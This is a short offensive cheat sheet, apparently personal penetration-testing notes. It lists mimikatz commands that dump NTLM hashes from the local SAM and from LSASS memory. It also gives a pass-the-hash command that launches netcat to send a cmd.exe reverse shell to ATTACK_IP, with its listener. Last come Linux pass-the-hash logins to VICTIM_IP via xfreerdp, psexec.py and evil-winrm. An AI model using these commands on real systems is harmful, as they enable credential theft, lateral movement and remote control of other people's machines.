# EXTRACT NTLM HASHES FROM LOCAL SAM

### privilege::debug

### token::elevate

### lsadump::sam -> LOCAL SAM DUMP

### sekurlsa::msv -> LSASS MEMORY DUMP

### token::revert

### sekurlsa::pth /user:USER.USER /domain:DOMAIN /ntlm:NTLM_HASH /run:"C\tools\nc64.exe -e cmd.exe ATTACK_IP PORT" 

### nc -lvp PORT

# PtH (Linux)

### xfreerdp /v:VICTIM_IP /u:DOMAIN\USER /pth NTLM_HASH

### psexec.py -hashes NTLM_HASH DOMAIN\USER@VICTIM_IP

### evil-winrm -i VICTIM_IP -u USER -H NTLM_HASH
